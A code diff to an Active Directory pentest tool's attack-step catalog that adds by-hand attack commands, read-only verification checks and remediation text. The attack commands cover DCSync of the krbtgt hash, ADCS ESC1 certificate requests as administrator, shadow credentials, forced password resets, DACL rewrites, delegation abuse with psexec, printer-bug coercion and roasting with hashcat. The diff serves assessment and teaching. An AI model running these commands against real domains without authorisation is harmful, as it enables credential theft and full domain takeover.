@@ -36,6 +36,7 @@ from __future__ import annotations
 
 import re
 from dataclasses import dataclass, replace
+from functools import lru_cache
 from typing import Any, Literal
 
 
@@ -146,6 +147,31 @@ class AttackStepCatalogEntry:
     narrative_template: str = ""
     # Short form: one-liner used in cards / chips / tooltips (web + PDF).
     short_narrative_template: str = ""
+    # Manual command a learner can run BY HAND with the standard offensive tool
+    # (nxc / certipy / impacket / bloodyAD / rubeus, whichever is canonical for
+    # this technique) to reproduce this step without ADscan. Consumed ONLY by the
+    # interactive didactic mode (``deep`` level) so a junior on an HTB box — or a
+    # senior meeting an unfamiliar attack — learns the by-hand equivalent. Keep it
+    # a real, copy-pasteable invocation with ``<placeholder>`` tokens for the
+    # values ADscan resolves at runtime (target, user, DC IP, template). Empty
+    # string = no manual equivalent authored yet (the didactic card omits the
+    # section). See CLAUDE.md § "ADscan is also a LEARNING tool".
+    manual_command: str = ""
+    # Independent-verification commands so the CLIENT can confirm the finding by
+    # hand (killing the false-positive objection). Unlike the vendor-neutral
+    # remediation prose, this DEDICATED verification block MAY name STANDARD
+    # verification tools — never competitors. Two perspectives:
+    #   verify_windows — native Microsoft / PowerShell (certutil, Get-ADUser,
+    #     Get-Acl, dsacls, Get-ADObject, Get-SmbServerConfiguration): the
+    #     preferred, sysadmin-runnable check.
+    #   verify_linux — the standard offensive tool from a Linux box (nxc /
+    #     netexec, certipy, impacket, bloodyAD) OR a thehacker.recipes reference
+    #     URL for the technique.
+    # Both accept the same placeholder set as narrative_template. Empty = not yet
+    # authored (the verification block is omitted). See CLAUDE.md
+    # § "Baked technique narratives" for the scoped exception this field carves.
+    verify_windows: str = ""
+    verify_linux: str = ""
     # Structured remediation steps (ordered). Each string may also contain
     # the same placeholder set as narrative_template.
     remediation_steps: tuple[str, ...] = ()
@@ -189,6 +215,9 @@ def _entry(
     finding_basis: FindingBasis = "observed_configuration",
     narrative_template: str = "",
     short_narrative_template: str = "",
+    manual_command: str = "",
+    verify_windows: str = "",
+    verify_linux: str = "",
     remediation_steps: tuple[str, ...] = (),
     source_context_requirement: SourceContextRequirement = "user_credentials",
     provides_context: str | None = None,
@@ -222,6 +251,9 @@ def _entry(
         finding_basis=finding_basis,
         narrative_template=narrative_template.strip(),
         short_narrative_template=short_narrative_template.strip(),
+        manual_command=manual_command.strip(),
+        verify_windows=verify_windows.strip(),
+        verify_linux=verify_linux.strip(),
         remediation_steps=tuple(remediation_steps),
         source_context_requirement=source_context_requirement,
         provides_context=provides_context,
@@ -1986,6 +2018,58 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         ),
     ),
     _entry(
+        "raisechild",
+        support_kind="supported",
+        support_reason=(
+            "Same-forest child-to-parent escalation. Every child domain shares the "
+            "forest trust key with its parent, so a compromise of the child domain "
+            "yields the material to forge an inter-realm ticket-granting ticket that "
+            "injects the forest-root privileged group's SID history. ADscan uses the "
+            "child's own replicated trust key to forge that ticket and replicate the "
+            "parent (forest root) as an Enterprise Admin — the forest is one trust "
+            "boundary, so owning any child domain owns the whole forest."
+        ),
+        compromise_semantics="direct_target_compromise",
+        compromise_effort="medium",
+        category="trust",
+        description=(
+            "Escalate from a compromised child domain to the forest root by forging "
+            "an inter-realm ticket carrying the forest-root privileged SID history, "
+            "using the shared forest trust key"
+        ),
+        vuln_key="raise_child_forest_root",
+        remediation_complexity="high",
+        remediation_effort=(
+            "Treat every domain in the forest as a single Tier-0 security boundary — "
+            "a child domain compromise is a forest compromise, so it cannot be fixed "
+            "by a per-domain control. Enable SID filtering / quarantine only on "
+            "EXTERNAL trusts (it cannot be applied to intra-forest trusts), confirm "
+            "trust state with the RSAT ActiveDirectory module (Get-ADTrust), and "
+            "restrict who can administer each child domain to the same standard as "
+            "the forest root. Where domains hold genuinely separate security "
+            "requirements, place them in SEPARATE forests rather than child domains."
+        ),
+        can_fully_mitigate=False,
+        mitre_technique_id="T1134.005",
+        mitre_technique_name="Access Token Manipulation: SID-History Injection",
+        detection_event_ids=("4769", "4768"),
+        bh_native=False,
+        bh_cypher_names=("RaiseChild",),
+        is_acl_edge=False,
+        finding_basis="observed_configuration",
+        source_context_requirement="user_credentials",
+        narrative_template=(
+            "{source} is a child domain of {target} in the same forest ({relation}). "
+            "Because every child shares the forest trust key with its parent, a "
+            "compromise of {source} can forge an inter-realm ticket with the forest "
+            "root's privileged SID history and take over {target} as an Enterprise "
+            "Admin — the forest is one security boundary."
+        ),
+        short_narrative_template=(
+            "Child domain {source} shares the forest key — can escalate to root {target}"
+        ),
+    ),
+    _entry(
         "writelogonscript",
         support_kind="supported",
         support_reason=(
@@ -2220,6 +2304,13 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         "dumpdpapi",
         support_kind="supported",
         support_reason="Decrypts DPAPI-protected credentials stored on the compromised host.",
+        compromise_semantics="direct_target_compromise",
+        # ADscan reads the DPAPI masterkeys off the host's ADMIN$ share and needs
+        # the DPAPI_SYSTEM key to decrypt machine masterkeys — both require an
+        # admin session on the source host. This must match dumplsa/dumplsass so
+        # a prior access edge only carries into it when it granted local admin
+        # (SQLAccess, which is a DB session, must NOT satisfy it).
+        source_context_requirement="local_admin_session",
         category="credential_access",
         description="Credential extraction from DPAPI-protected material",
         remediation_complexity="medium",
@@ -2563,8 +2654,12 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
     ),
     _entry(
         "userdescription",
-        support_kind="unsupported",
-        support_reason="Not implemented yet in ADscan",
+        support_kind="supported",
+        support_reason=(
+            "ADscan reads the description and info attributes of directory accounts "
+            "over LDAP and recovers any plaintext credential stored there, then "
+            "verifies it against the domain to confirm a working login."
+        ),
         compromise_semantics="direct_target_compromise",
         compromise_effort="low",
         category="entry_vector",
@@ -2911,6 +3006,66 @@ def context_requirement_satisfied(
     return next_source_context_requirement in allowed
 
 
+# ── Carry-forward host-session grants ─────────────────────────────────────────
+#
+# The PRECISE session context a completed ACCESS edge grants on the host it lands
+# on — used by the attack-path execution gate to carry a proven foothold into the
+# next post-exploitation (``EdgeKind.DERIVED``) step of the SAME chain.
+#
+# This is DELIBERATELY finer than ``_SEMANTICS_TO_PROVIDES`` (which coarsely maps
+# every ``access_capability_only`` edge → ``local_admin_session`` so the DFS lets
+# post-ex follow). For the carry-forward GATE the distinction matters: a SQL
+# session is NOT a local-admin session, and a CanPSRemote/CanRDP shell runs as the
+# acting user, not as admin. Keeping this table separate from the DFS provides map
+# is what lets ``SQLAccess → DumpLSA`` be BLOCKED at the gate (a SQL session does
+# not satisfy DumpLSA's ``local_admin_session`` requirement) without moving path
+# discovery. The keys ARE the set of access edges whose success establishes a
+# reusable host session; a relation absent here grants no carry-forward foothold.
+_HOST_ACCESS_SESSION_GRANTS: dict[str, str] = {
+    # Full local admin → LSASS / SAM / SYSTEM. Satisfies local_admin_session.
+    "adminto": "local_admin_session",
+    "hassession": "local_admin_session",
+    # A SQL session that reaches OS command execution (once xp_cmdshell) — the
+    # mssql_rce_session context the MSSQL SYSTEM-escalation follow-ups require. It
+    # is NOT a local-admin session, so it does NOT satisfy the dump-type edges.
+    "sqladmin": "mssql_rce_session",
+    "sqlaccess": "mssql_rce_session",
+    # A shell as the acting principal (WinRM / RDP / DCOM session). Satisfies a
+    # user-context post-ex run (e.g. that user's own DPAPI blobs), NOT admin.
+    "canpsremote": "user_credentials",
+    "canrdp": "user_credentials",
+    "executedcom": "user_credentials",
+}
+
+
+def access_session_grant_for_relation(relation: str) -> str | None:
+    """Return the host-session context a completed ACCESS edge grants, or ``None``.
+
+    ``None`` means the relation is not a session-granting access edge, so its
+    success establishes no carry-forward foothold on the target host. Keyed
+    punctuation-insensitively (a PascalCase ``AdminTo`` resolves to ``adminto``).
+    """
+    return _HOST_ACCESS_SESSION_GRANTS.get(_relation_lookup_key(relation))
+
+
+def access_grant_satisfies_requirement(grant: str, requirement: str) -> bool:
+    """Return whether a host session PROVIDING ``grant`` satisfies a consumer
+    REQUIRING ``requirement``.
+
+    Reuses the one context-compatibility SSOT (:data:`_CONTEXT_COMPAT`) that the
+    DFS chain gate uses, so "does this access level cover this post-ex step" is
+    answered exactly once. ``local_admin_session`` covers ``local_admin_session``
+    (and ``none``); ``mssql_rce_session`` covers only its own; ``user_credentials``
+    covers ``user_credentials`` / ``none`` — so ``AdminTo → DumpLSA`` allows and
+    ``SQLAccess → DumpLSA`` blocks. A user-level session (CanPSRemote / CanRDP /
+    ExecuteDCOM) satisfies a ``user_credentials`` post-ex step but NOT a dump-type
+    edge (which requires ``local_admin_session``), because ADscan's dump routines
+    read machine secrets off the host and genuinely need an admin session.
+    """
+    allowed = _CONTEXT_COMPAT.get(str(grant or ""), frozenset())
+    return str(requirement or "") in allowed
+
+
 def get_attack_step_catalog() -> tuple[AttackStepCatalogEntry, ...]:
     """Return all raw catalog entries as a tuple (pre-narrative-enrichment).
 
@@ -3006,8 +3161,16 @@ def _relation_lookup_key(relation: str) -> str:
     return re.sub(r"[^a-z0-9]+", "", str(relation or "").strip().lower())
 
 
+@lru_cache(maxsize=None)
 def normalize_relation(relation: str) -> str:
-    """Normalize relation names for robust catalog lookups."""
+    """Normalize relation names for robust catalog lookups.
+
+    Reads only the module-level ``_RELATION_ALIASES_BY_KEY`` (built once at
+    import, never mutated) and ``_relation_lookup_key`` (a pure regex sub), so
+    the output depends only on the single hashable ``str`` argument — safe to
+    memoize across domains. The distinct relation set in a domain is small and
+    bounded, so an unbounded cache is memory-safe.
+    """
     raw = str(relation or "").strip().lower()
     if not raw:
         return ""
@@ -3453,6 +3616,32 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "and mount an offline brute-force attack against weak passwords. "
             "Once cracked, the attacker fully impersonates {target}."
         ),
+        "manual": (
+            "# Request the TGS-REP hash for the SPN-bearing account:\n"
+            "nxc ldap <dc_ip> -u <user> -p <pass> --kerberoasting roast.txt\n"
+            "#   (or, targeting one account)  impacket-GetUserSPNs <domain>/<user>:<pass> "
+            "-dc-ip <dc_ip> -request-user {target} -outputfile roast.txt\n"
+            "# Crack it offline:\n"
+            "hashcat -m 13100 roast.txt wordlist.txt"
+        ),
+        "verify_windows": (
+            "Confirm {target} is exposed to Kerberoasting by listing its service "
+            "principal names — any non-empty result means the account can be "
+            "roasted:\n"
+            "Get-ADUser -Identity {target} -Properties servicePrincipalName, "
+            "msDS-SupportedEncryptionTypes |\n"
+            "  Select-Object SamAccountName, servicePrincipalName, "
+            "msDS-SupportedEncryptionTypes\n"
+            "# List every roastable account in the domain:\n"
+            "Get-ADUser -LDAPFilter '(&(servicePrincipalName=*)"
+            "(!(objectClass=computer)))' -Properties servicePrincipalName"
+        ),
+        "verify_linux": (
+            "List the SPN-bearing accounts (read-only enumeration, no ticket "
+            "requested):\n"
+            "nxc ldap {dc_ip} -u <user> -p <pass> --kerberoasting /dev/null\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/kerberoast"
+        ),
         "remediation": (
             "Enforce strong, random passwords (25+ chars) or migrate the account to a Group Managed Service Account (gMSA).",
             "Enable AES-only encryption on the service account (msDS-SupportedEncryptionTypes) and disable RC4 where possible.",
@@ -3468,6 +3657,29 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "message encrypted with the account's password-derived key and crack "
             "it offline. Successful cracking yields full credentials for {target}."
         ),
+        "manual": (
+            "# Roast every pre-auth-disabled account the credential can see:\n"
+            "nxc ldap <dc_ip> -u <user> -p <pass> --asreproast asrep.txt\n"
+            "#   (no creds needed if you already know the sAMAccountName)\n"
+            "impacket-GetNPUsers <domain>/ -dc-ip <dc_ip> -usersfile users.txt "
+            "-no-pass -format hashcat -outputfile asrep.txt\n"
+            "# Crack it offline:\n"
+            "hashcat -m 18200 asrep.txt wordlist.txt"
+        ),
+        "verify_windows": (
+            "Confirm {target} has pre-authentication disabled — bit 0x400000 "
+            "(DONT_REQ_PREAUTH) set on userAccountControl:\n"
+            "Get-ADUser -Identity {target} -Properties DoesNotRequirePreAuth |\n"
+            "  Select-Object SamAccountName, DoesNotRequirePreAuth\n"
+            "# List every AS-REP-roastable account in the domain:\n"
+            "Get-ADUser -LDAPFilter "
+            "'(userAccountControl:1.2.840.113556.1.4.803:=4194304)'"
+        ),
+        "verify_linux": (
+            "List accounts with pre-auth disabled (read-only enumeration):\n"
+            "nxc ldap {dc_ip} -u <user> -p <pass> --asreproast /dev/null\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/asreproast"
+        ),
         "remediation": (
             "Enable Kerberos pre-authentication for {target} (clear DONT_REQ_PREAUTH in userAccountControl).",
             "Enforce strong passwords on accounts that must keep pre-auth disabled.",
@@ -3482,6 +3694,32 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "target's password, add Shadow Credentials (msDS-KeyCredentialLink), "
             "set a Service Principal Name to enable Kerberoasting, or write a "
             "logon script, any of which results in complete compromise of {target}."
+        ),
+        "manual": (
+            "# Shadow Credentials (works on a computer or user target):\n"
+            "certipy shadow auto -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-account {target}\n"
+            "#   or force a password reset over LDAP:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
+            "set password {target} 'Newpass123!'"
+        ),
+        "verify_windows": (
+            "Confirm {source} holds GenericAll over {target}. Resolve the target DN, "
+            "then read the ACL and filter to the principal:\n"
+            "$dn = (Get-ADObject -LDAPFilter '(sAMAccountName={target})')"
+            ".DistinguishedName\n"
+            "(Get-Acl \"AD:$dn\").Access |\n"
+            "  Where-Object { $_.IdentityReference -like '*{source}*' -and "
+            "$_.ActiveDirectoryRights -match 'GenericAll' }\n"
+            "# A row with ActiveDirectoryRights=GenericAll, AccessControlType=Allow "
+            "confirms the finding."
+        ),
+        "verify_linux": (
+            "Read the target's security descriptor and confirm {source} has full "
+            "control (read-only):\n"
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "get object {target} --attr nTSecurityDescriptor --resolve-sd\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/dacl/grant-rights"
         ),
         "remediation": (
             "Remove the GenericAll ACE that {source} holds over {target}. Resolve the object's "
@@ -3520,6 +3758,31 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "certificate, setting a servicePrincipalName to enable Kerberoasting, "
             "or modifying scriptPath / msDS-AllowedToActOnBehalfOfOtherIdentity. "
             "Any of these leads to full compromise of {target}."
+        ),
+        "manual": (
+            "# Write msDS-KeyCredentialLink (Shadow Credentials) then PKINIT-auth:\n"
+            "certipy shadow auto -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-account {target}\n"
+            "#   or set an SPN to make {target} kerberoastable:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
+            "set object {target} servicePrincipalName -v 'host/adscan'"
+        ),
+        "verify_windows": (
+            "Confirm {source} can write {target}'s attributes. Resolve the DN, then "
+            "read the ACL and filter to the principal:\n"
+            "$dn = (Get-ADObject -LDAPFilter '(sAMAccountName={target})')"
+            ".DistinguishedName\n"
+            "(Get-Acl \"AD:$dn\").Access |\n"
+            "  Where-Object { $_.IdentityReference -like '*{source}*' -and "
+            "$_.ActiveDirectoryRights -match 'GenericWrite|WriteProperty' }\n"
+            "# An Allow row with GenericWrite (or broad WriteProperty) confirms it."
+        ),
+        "verify_linux": (
+            "List the objects {source} can write and confirm {target} is among them "
+            "(read-only), or read the target's SD directly:\n"
+            "bloodyAD --host {dc_ip} -d {domain} -u {source} -p <pass> "
+            "get writable --detail\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/dacl/grant-rights"
         ),
         "remediation": (
             "Remove the GenericWrite ACE that {source} holds on {target}. Resolve the object's "
@@ -3562,6 +3825,29 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "ACE granting themselves full control, then escalates as if they owned "
             "the object directly. This is a two-step takeover chain."
         ),
+        "manual": (
+            "# Grant {source} DCSync (or GenericAll) on {target} by rewriting the DACL:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
+            "add dcsync {source}\n"
+            "#   generic-object variant:\n"
+            "impacket-dacledit -action write -rights FullControl -principal {source} "
+            "-target {target} <domain>/{source}:<pass> -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "Confirm {source} can rewrite {target}'s ACL (WriteDacl):\n"
+            "$dn = (Get-ADObject -LDAPFilter '(sAMAccountName={target})')"
+            ".DistinguishedName\n"
+            "(Get-Acl \"AD:$dn\").Access |\n"
+            "  Where-Object { $_.IdentityReference -like '*{source}*' -and "
+            "$_.ActiveDirectoryRights -match 'WriteDacl' }"
+        ),
+        "verify_linux": (
+            "Read the target's security descriptor and confirm {source} has "
+            "WriteDacl (read-only):\n"
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "get object {target} --attr nTSecurityDescriptor --resolve-sd\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/dacl/grant-rights"
+        ),
         "remediation": (
             "Remove the WriteDACL ACE from {source} on {target}.",
             "Monitor Event ID 5136 for ACL modifications on sensitive objects.",
@@ -3573,6 +3859,28 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "WriteOwner allows {source} to take ownership of {target}. Once "
             "ownership is seized, the attacker can rewrite the DACL at will, "
             "effectively granting full control over the object."
+        ),
+        "manual": (
+            "# Take ownership of {target}, then rewrite its DACL to full control:\n"
+            "impacket-owneredit -action write -new-owner {source} -target {target} "
+            "<domain>/{source}:<pass> -dc-ip <dc_ip>\n"
+            "impacket-dacledit -action write -rights FullControl -principal {source} "
+            "-target {target} <domain>/{source}:<pass> -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "Confirm {source} can take ownership of {target} (WriteOwner):\n"
+            "$dn = (Get-ADObject -LDAPFilter '(sAMAccountName={target})')"
+            ".DistinguishedName\n"
+            "(Get-Acl \"AD:$dn\").Access |\n"
+            "  Where-Object { $_.IdentityReference -like '*{source}*' -and "
+            "$_.ActiveDirectoryRights -match 'WriteOwner' }"
+        ),
+        "verify_linux": (
+            "Read the target's security descriptor and confirm {source} has "
+            "WriteOwner (read-only):\n"
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "get object {target} --attr nTSecurityDescriptor --resolve-sd\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/dacl/grant-rights"
         ),
         "remediation": (
             "Remove the WriteOwner permission from {source} on {target}.",
@@ -3587,6 +3895,14 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "attacker resets the password and authenticates as {target} directly, "
             "completely taking over the account."
         ),
+        "manual": (
+            "# Reset {target}'s password without knowing the current one:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
+            "set password {target} 'Newpass123!'\n"
+            "#   nxc equivalent:\n"
+            "nxc smb <dc_ip> -u {source} -p <pass> -M change-password "
+            "-o USER={target} NEWPASS='Newpass123!'"
+        ),
         "remediation": (
             "Remove the User-Force-Change-Password extended right from {source} on {target}.",
             "Review delegated password-reset rights. They should be granted only to helpdesk / tier-appropriate personnel.",
@@ -3600,6 +3916,14 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "often through nested group chains, is inherited immediately by the "
             "attacker."
         ),
+        "manual": (
+            "# Add {source} to the {target} group over LDAP:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
+            "add groupMember {target} {source}\n"
+            "#   nxc equivalent:\n"
+            "nxc ldap <dc_ip> -u {source} -p <pass> -M add-member "
+            "-o GROUP={target} USER={source}"
+        ),
         "remediation": (
             "Remove the AddMember extended right from {source} on {target}.",
             "Audit recent group membership changes via Event ID 4728/4732/4756.",
@@ -3612,6 +3936,11 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "group. After self-insertion, {source} inherits every privilege held "
             "by {target}, often a fast path to tier-0 via nested group chains."
         ),
+        "manual": (
+            "# Join the {target} group directly:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
+            "add groupMember {target} {source}"
+        ),
         "remediation": (
             "Remove the AddSelf extended right from {source} on {target}.",
         ),
@@ -3623,6 +3952,13 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "on the ms-Mcs-AdmPwd (or ms-LAPS-Password) attribute of {target}. "
             "{source} simply queries the attribute via LDAP to retrieve the local "
             "Administrator password in cleartext and pivots to {target}."
+        ),
+        "manual": (
+            "# Read the LAPS local-admin password over LDAP:\n"
+            "nxc ldap <dc_ip> -u {source} -p <pass> -M laps\n"
+            "#   or query the attribute directly:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
+            "get object {target} --attr ms-Mcs-AdmPwd"
         ),
         "remediation": (
             "Remove the Control Access ACE on ms-Mcs-AdmPwd / ms-LAPS-Password from {source} on {target}.",
@@ -3637,6 +3973,13 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "password blob. {source} then derives the NT hash and impersonates "
             "{target} directly."
         ),
+        "manual": (
+            "# Retrieve the gMSA managed password and derive the NT hash:\n"
+            "nxc ldap <dc_ip> -u {source} -p <pass> --gmsa\n"
+            "#   or:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
+            "get object {target} --attr msDS-ManagedPassword"
+        ),
         "remediation": (
             "Remove {source} from the msDS-GroupMSAMembership of {target}.",
             "Minimize the gMSA password-retrieval principals to the service hosts that actually need them.",
@@ -3650,6 +3993,13 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "controls {source} can request tickets as any user in the domain "
             "(including tier-0 admins) to services on {target}, fully compromising "
             "it."
+        ),
+        "manual": (
+            "# S4U2self+S4U2proxy: impersonate administrator to a service on {target}:\n"
+            "impacket-getST -spn cifs/{target} -impersonate administrator "
+            "-dc-ip <dc_ip> <domain>/{source}:<pass>\n"
+            "# Use the ticket:\n"
+            "KRB5CCNAME=administrator@cifs_{target}.ccache impacket-psexec -k -no-pass {target}"
         ),
         "remediation": (
             "Remove services from msDS-AllowedToDelegateTo on {source}, or replace with Resource-Based Constrained Delegation.",
@@ -3693,6 +4043,30 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "(DCSync). Extracting the krbtgt hash yields persistent golden-ticket "
             "capability and full domain compromise."
         ),
+        "manual": (
+            "# Replicate the krbtgt hash (and any account) via DRSUAPI:\n"
+            "impacket-secretsdump <domain>/{source}:<pass>@<dc_ip> -just-dc-user krbtgt\n"
+            "#   nxc equivalent (dumps NTDS via DRSUAPI):\n"
+            "nxc smb <dc_ip> -u {source} -p <pass> --ntds"
+        ),
+        "verify_windows": (
+            "Confirm {source} holds the two replication rights on the domain head "
+            "that make DCSync possible (GUIDs 1131f6aa- and 1131f6ad-):\n"
+            "$dn = (Get-ADDomain).DistinguishedName\n"
+            "(Get-Acl \"AD:$dn\").Access |\n"
+            "  Where-Object { $_.IdentityReference -like '*{source}*' -and "
+            "$_.ObjectType -in "
+            "'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',"
+            "'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' } |\n"
+            "  Select-Object IdentityReference, ActiveDirectoryRights, ObjectType"
+        ),
+        "verify_linux": (
+            "Read the domain object's DACL and confirm {source} has the "
+            "Get-Changes / Get-Changes-All rights (read-only):\n"
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "get object <domain-dn> --attr nTSecurityDescriptor --resolve-sd\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"
+        ),
         "remediation": (
             "Remove DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights from {source} on the domain.",
             "Limit these rights to DCs and approved replication service accounts only.",
@@ -3721,6 +4095,29 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "that authenticates as that user via PKINIT, fully compromising "
             "{target}."
         ),
+        "manual": (
+            "# Request a cert for a privileged user by supplying the SAN:\n"
+            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> \\\n"
+            "  -ca <ca_name> -template {template} -upn administrator@<domain>\n"
+            "# Authenticate with the issued cert to recover a TGT / NT hash:\n"
+            "certipy auth -pfx administrator.pfx -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "Confirm template {template} is ESC1-vulnerable: it authorizes client "
+            "authentication AND lets the enrollee supply the subject (SAN). The "
+            "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT bit is 0x1 in msPKI-Certificate-Name-"
+            "Flag:\n"
+            "certutil -v -template {template} |\n"
+            "  Select-String -Pattern 'ENROLLEE_SUPPLIES_SUBJECT', "
+            "'Client Authentication', 'msPKI-Certificate-Name-Flag'"
+        ),
+        "verify_linux": (
+            "Enumerate ADCS and confirm {template} is flagged vulnerable (read-only "
+            "collection, no request issued):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
+        ),
         "remediation": (
             "Disable 'Enrollee supplies subject' on template {template}, or require manager approval for enrollment.",
             "Restrict enrollment permissions on {template} to authorized identities only.",
@@ -3735,6 +4132,12 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "coerced via the Printer Bug / PetitPotam, deposits a forwardable "
             "TGT in {source}'s LSASS. The attacker dumps the TGT and pivots as "
             "that user to {target}."
+        ),
+        "manual": (
+            "# On the compromised {source}, monitor for and capture arriving TGTs:\n"
+            "impacket-krbrelayx -t ldap://<dc_ip> --victim {target}\n"
+            "# Coerce a privileged account (e.g. a DC) to authenticate to {source}:\n"
+            "impacket-printerbug <domain>/{source}:<pass>@<target_dc> <source_ip>"
         ),
         "remediation": (
             "Remove TRUSTED_FOR_DELEGATION from {source} unless strictly required; prefer constrained or resource-based delegation.",
@@ -3807,6 +4210,9 @@ for _rel, _entry_obj in ATTACK_STEP_CATALOG.items():
             short_narrative_template=_overlay.get(
                 "short", _entry_obj.short_narrative_template
             ),
+            manual_command=_overlay.get("manual", _entry_obj.manual_command),
+            verify_windows=_overlay.get("verify_windows", _entry_obj.verify_windows),
+            verify_linux=_overlay.get("verify_linux", _entry_obj.verify_linux),
             remediation_steps=tuple(
                 _overlay.get("remediation", _entry_obj.remediation_steps)
             ),
@@ -3921,6 +4327,28 @@ def _extract_step_placeholders(step: dict[str, Any]) -> dict[str, str]:
     if isinstance(details, dict):
         connecting_login = str(details.get("connecting_login") or "").strip()
 
+    # Environment infrastructure values for the independent-verification commands.
+    # dc_ip and the domain name are NOT secrets — they are the scanned
+    # environment's own coordinates — so substituting them turns the verify block
+    # into a command the client can paste and run against their DC, instead of
+    # one carrying literal <dc_ip>/<domain> tokens they must fill in by hand. The
+    # render seams (report, attack-path snapshot, attack-graph edge bake) stamp
+    # the real dc_ip (resolved via the resolve_dc_ip SSOT) and domain into the
+    # step details before this runs; when a seam has neither (a LITE/runtime
+    # context, or a synthetic per-relation edge bake), the fallback keeps the
+    # literal angle-bracket token so the command stays valid and copyable.
+    #
+    # SECURITY: <user> and <pass> are deliberately NOT resolved here. <pass> is
+    # the client's credential and must NEVER be written into a command that lands
+    # in a PDF or the web CTEM. <user> is ambiguous (attacker vs auditor vs the
+    # step's own principal) so it stays a literal placeholder the operator fills
+    # in; the step's concrete principal is already exposed through {source}.
+    dc_ip = ""
+    domain = ""
+    if isinstance(details, dict):
+        dc_ip = str(details.get("dc_ip") or "").strip()
+        domain = str(details.get("domain") or "").strip()
+
     # xp_cmdshell execution plan — whether OS-command execution is already
     # available on the instance or the attacker must enable it first (and revert
     # it afterward). Carried from the overlay notes into details. Always resolves
@@ -3950,6 +4378,10 @@ def _extract_step_placeholders(step: dict[str, Any]) -> dict[str, str]:
         "execution_identity": execution_identity or "the SQL Server service account",
         "connecting_login": connecting_login or "the connecting login",
         "xp_cmdshell_plan": xp_cmdshell_plan,
+        # Degrade to the literal angle-bracket token when the seam had no value,
+        # so the verify command is still valid and copyable (never "None").
+        "dc_ip": dc_ip or "<dc_ip>",
+        "domain": domain or "<domain>",
     }
 
 
@@ -4070,6 +4502,38 @@ def render_step_narrative(
     # contain a period (a hostname, an FQDN), so the sentence boundary is only
     # knowable once the real names are in place.
     return lead_sentence(rendered) if derive_from_long else rendered
+
+
+def render_step_manual_command(step: dict[str, Any]) -> str:
+    """Render the by-hand manual command for one attack-path step.
+
+    Returns the catalog entry's ``manual_command`` with the ``{source}`` /
+    ``{target}`` / ``{template}`` placeholders substituted from the concrete
+    step, so the learner sees the real principal/target names rather than
+    template tokens. Runtime-only values ADscan resolves during execution
+    (``<dc_ip>``, ``<pass>``, ``<ca_name>``) stay as ``<…>`` tokens for the
+    learner to fill in — they are angle-bracket tokens, not ``{}`` placeholders,
+    so ``str.format`` leaves them untouched.
+
+    Returns an empty string when the relation is unknown or has no authored
+    manual command (the didactic card then omits the "Try it by hand" section).
+    Consumed by the interactive didactic mode ONLY — never by the client report.
+    """
+    if not isinstance(step, dict):
+        return ""
+    relation_raw = step.get("action") or step.get("relation") or step.get("type") or ""
+    entry = get_attack_step_entry(str(relation_raw))
+    if entry is None or not entry.manual_command:
+        return ""
+    placeholders = _extract_step_placeholders(step)
+    tmpl = entry.manual_command
+    try:
+        return tmpl.format(**placeholders)
+    except (KeyError, IndexError):
+        rendered = tmpl
+        for k, v in placeholders.items():
+            rendered = rendered.replace("{" + k + "}", v)
+        return rendered
 
 
 #: What a step out of an already-Tier-0-direct principal tells the client
